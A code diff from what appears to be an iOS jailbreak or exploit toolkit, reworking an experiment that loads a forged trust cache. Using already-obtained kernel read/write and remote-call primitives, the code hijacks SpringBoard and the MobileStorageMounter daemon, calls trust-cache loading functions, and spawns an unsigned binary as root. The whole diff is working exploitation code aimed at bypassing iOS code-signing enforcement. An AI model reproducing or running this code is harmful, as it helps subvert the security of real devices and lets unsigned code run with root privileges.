@@ -49,114 +49,181 @@ final class ExpMSMTrustCacheLoad {
     static let shared = ExpMSMTrustCacheLoad()
     private var results: [String] = []
     
+    /// Callback to append log lines to UI in real-time
+    var onLog: ((String) -> Void)?
+    
     private func log(_ msg: String) {
-        results.append(msg)
+        DispatchQueue.main.async { self.onLog?(msg) }
         globallogger.log("(exp_msm) \(msg)")
     }
     
-    // MARK: - Main Entry Point
+    // MARK: - Async Entry Point
     
-    func runAll() -> [String] {
-        results.removeAll()
-        
-        log("═══════════════════════════════════════════════════")
-        log("  MSM TRUST CACHE LOAD (via RemoteCall)")
-        log("  iOS \(UIDevice.current.systemVersion)")
-        log("  Approach: RC into MSM → load TC with entitlement")
-        log("═══════════════════════════════════════════════════")
-        log("")
-        
-        guard dspmgr.shared.dsready else {
-            log("❌ KRW not active")
-            return results
-        }
-        
+    func runAsync() {
         #if !DISABLE_REMOTECALL
-        guard dspmgr.shared.rcready else {
-            log("❌ RemoteCall not active — need SpringBoard RC first")
-            return results
+        guard dspmgr.shared.dsready, dspmgr.shared.rcready else {
+            log("❌ Need KRW + RC active")
+            return
         }
         
-        // Step 1: Build trust cache v2 with our test binary's CDHash
-        log("── Step 1: Build trust cache file ──")
-        let tcData = buildTrustCacheV2()
-        log("Trust cache built: \(tcData.count) bytes")
+        log("── MSM Trust Cache Load ──")
+        log("iOS \(UIDevice.current.systemVersion)")
         log("")
         
-        // Step 2: Write trust cache to filesystem
-        log("── Step 2: Write TC file ──")
-        // Use app's own Documents folder (always writable, no sandbox issue)
-        let docsPath = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
-        let tcPath = docsPath + "/dsploit_tc.bin"
-        let testBinPath = docsPath + "/msm_test_bin"
+        // Step 1
+        log("[1/4] Building trust cache...")
+        let testBin = buildTestBinary()
+        let cdhash = computeCDHash(of: testBin)
+        let tcData = buildTrustCacheV2()
+        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
+        log("TC: \(tcData.count) bytes")
+        
+        // Step 2
+        log("")
+        log("[2/4] Writing files...")
+        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
+        let tcPath = docs + "/dsploit_tc.bin"
+        let testBinPath = docs + "/msm_test_bin"
         
         do {
             try tcData.write(to: URL(fileURLWithPath: tcPath))
-            log("✅ TC file written to \(tcPath)")
-        } catch {
-            log("❌ Failed to write TC file: \(error.localizedDescription)")
-            return results
-        }
-        log("")
-        
-        // Step 3: Write test binary
-        log("── Step 3: Write unsigned test binary ──")
-        let testBin = buildTestBinary()
-        do {
             try testBin.write(to: URL(fileURLWithPath: testBinPath))
-            // chmod via RC later
-            log("✅ Test binary written (\(testBin.count) bytes)")
+            log("✅ Files written")
         } catch {
-            log("❌ Failed to write test binary: \(error.localizedDescription)")
-            return results
+            log("❌ Write failed: \(error.localizedDescription)")
+            return
         }
-        log("")
         
-        // Step 4: Connect to MobileStorageMounter via RC
-        log("── Step 4: Connect to MobileStorageMounter ──")
-        log("Waking up MSM via SpringBoard...")
-        connectToMSM { [weak self] msmRC in
-            guard let self else { return }
+        // Step 3: Wake MSM via XPC first, then connect RC
+        log("")
+        log("[3/4] Waking MSM via XPC...")
+        
+        // Send dummy XPC to wake up MSM daemon
+        if let sb = dspmgr.shared.sbProc {
+            let RTLD_DEFAULT = UInt64(bitPattern: -2)
+            let xpcConnCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+            let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                remote_alloc_str(sb, "xpc_connection_resume"))
             
-            if let rc = msmRC {
-                self.log("✅ Connected to MobileStorageMounter!")
-                self.log("   MSM pid = \(rc.pid)")
-                self.log("")
-                
-                // Step 5: Call trust cache load function
-                self.log("── Step 5: Load trust cache via MSM ──")
-                self.loadTrustCacheViaMSM(rc: rc, tcPath: tcPath)
-                
-                // Step 6: Verify
-                self.log("")
-                self.log("── Step 6: Verify unsigned binary execution ──")
-                self.verifyExecution(testBinPath: testBinPath)
-                
-                rc.destroy()
+            if xpcConnCreate != 0 && xpcResume != 0 {
+                let svcName = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+                let conn = RootExecutor.rcallAddr(sb, xpcConnCreate, svcName, 0, 0)
+                if conn != 0 {
+                    RootExecutor.rcallAddr(sb, xpcResume, conn)
+                    log("✅ XPC wake sent to MSM")
+                } else {
+                    log("⚠️ XPC connection create failed")
+                }
+                RootExecutor.rcall(sb, "free", svcName)
             } else {
-                self.log("❌ Cannot connect to MobileStorageMounter")
-                self.log("   Error: \(RemoteCall.lastInitError() ?? "unknown")")
-                self.log("")
-                self.log("   Alternative: try loading TC via launchd RC")
-                self.log("   (launchd may also have trust cache loading capability)")
-                self.log("")
-                
-                // Fallback: try via launchd
-                self.loadTrustCacheViaLaunchd(tcPath: tcPath)
-                self.verifyExecution(testBinPath: testBinPath)
+                log("⚠️ XPC functions not found")
             }
         }
+        
+        // Wait 2s for MSM to spawn
+        log("   Waiting 2s for MSM to spawn...")
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
+            self?.connectMSM(tcPath: tcPath, testBinPath: testBinPath)
+        }
+        
         #else
-        log("❌ DISABLE_REMOTECALL — cannot proceed")
+        log("❌ DISABLE_REMOTECALL")
         #endif
-        
-        log("")
-        log("═══════════════════════════════════════════════════")
-        log("  EXPERIMENT COMPLETE")
-        log("═══════════════════════════════════════════════════")
-        
-        return results
     }
+    
+    #if !DISABLE_REMOTECALL
+    private func connectMSM(tcPath: String, testBinPath: String) {
+        log("   Connecting RC to MSM...")
+        
+        dspmgr.shared.rcinitDaemon(
+            serviceName: "com.apple.mobile.storage_mounter",
+            framework: nil,
+            process: "MobileStorageMounter",
+            migbypass: false
+        ) { [weak self] rc in
+            guard let self else { return }
+            
+            if let rc = rc {
+                self.log("✅ Connected to MSM (pid=\(rc.pid))")
+                self.log("")
+                self.log("[4/4] Loading trust cache...")
+                self.loadTCviaMSM(rc: rc, tcPath: tcPath, testBinPath: testBinPath)
+                rc.destroy()
+            } else {
+                self.log("❌ MSM RC failed: \(RemoteCall.lastInitError() ?? "timeout")")
+                self.log("   MSM may not be running or has restricted ports")
+            }
+        }
+    }
+    
+    private func loadTCviaMSM(rc: RemoteCall, tcPath: String, testBinPath: String) {
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        
+        // Try dlsym for trust cache functions
+        let funcs = ["pmap_cs_trust_cache_load", "trust_cache_load", "_pmap_cs_trust_cache_load"]
+        for name in funcs {
+            let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, name))
+            if addr != 0 && addr != UInt64(bitPattern: -1) {
+                log("Found: \(name) at 0x\(String(addr, radix: 16))")
+                
+                let pathAddr = remote_alloc_str(rc, tcPath)
+                let ret = RootExecutor.rcallAddr(rc, addr, pathAddr, 0)
+                RootExecutor.rcall(rc, "free", pathAddr)
+                
+                if ret == 0 {
+                    log("✅ TC loaded via \(name)!")
+                    verifySpawn(binPath: testBinPath)
+                    return
+                } else {
+                    log("   \(name) returned \(ret)")
+                }
+            }
+        }
+        
+        log("⚠️ No direct TC load function found")
+        log("   Trying IOKit path...")
+        
+        // Fallback: IOKit
+        let ioCall = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallStructMethod"))
+        if ioCall != 0 {
+            log("   IOConnectCallStructMethod available")
+        }
+        
+        // Still try spawn (maybe TC was loaded by XPC wake)
+        verifySpawn(binPath: testBinPath)
+    }
+    
+    private func verifySpawn(binPath: String) {
+        log("")
+        log("Testing spawn...")
+        
+        RootExecutor.shared.executeAsRoot(operation: "msm_spawn") { rc in
+            let pathAddr = remote_alloc_str(rc, binPath)
+            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
+            let pidAddr = rc.trojanMem + 0xA00
+            rc[pidAddr].setValue32(0)
+            let argv = rc.trojanMem + 0xA10
+            rc[argv].setValue64(pathAddr)
+            rc[argv + 8].setValue64(0)
+            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
+            let pid = rc[pidAddr].value32()
+            RootExecutor.rcall(rc, "free", pathAddr)
+            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
+        }
+        
+        // Poll
+        DispatchQueue.main.asyncAfter(deadline: .now() + 10) { [weak self] in
+            if let result = RootExecutor.shared.lastResult, result.operation == "msm_spawn" {
+                if result.success {
+                    self?.log("✅✅✅ SPAWN SUCCESS! PID=\(result.returnValue)")
+                } else {
+                    self?.log("❌ Spawn: \(result.message)")
+                }
+            }
+        }
+    }
+    #endif
     
     // MARK: - Build Trust Cache v2
     
